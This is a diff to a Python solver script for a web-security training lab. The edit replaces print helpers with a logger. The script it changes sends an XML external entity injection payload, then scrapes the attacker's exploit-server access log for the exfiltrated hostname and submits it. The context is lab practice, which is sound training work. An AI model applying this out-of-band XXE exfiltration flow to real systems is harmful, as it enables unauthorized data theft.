@@ -1,4 +1,4 @@
-from web_security_academy.core.utils import *
+from web_security_academy.core.logger import logger
 from lxml import etree
 
 import requests
@@ -28,22 +28,22 @@ def solve_lab(session):
     )
     data = data.decode()
 
-    print_info(
-        f'Injecting an XML external entity with the following POST request data to "{path}":\n'
+    logger.info(
+        f'Injecting an XML external entity with the following POST request data to "{path}":'
     )
-    print(f"{data}\n")
+    print(f"{data}")
 
     session.post_path(path, data=data)
-    print_success("XXE injection successful.\n")
+    logger.success("XXE injection successful.")
 
-    print_info("Extracting hostname from exploit server log...")
+    logger.info("Extracting hostname from exploit server log...")
     log = exploit_server.access_log()
     hostnames = re.findall(r"(?<=\/\?x=)[^ ]+", log)
 
     if len(hostnames) == 0:
-        print_fail("Unable to extract hostname.")
+        logger.failure("Unable to extract hostname.")
     else:
         hostname = hostnames[-1]
-        print_success(f"Hostname: {hostname}\n")
+        logger.success(f"Hostname: {hostname}")
 
     session.submit_solution(hostname)
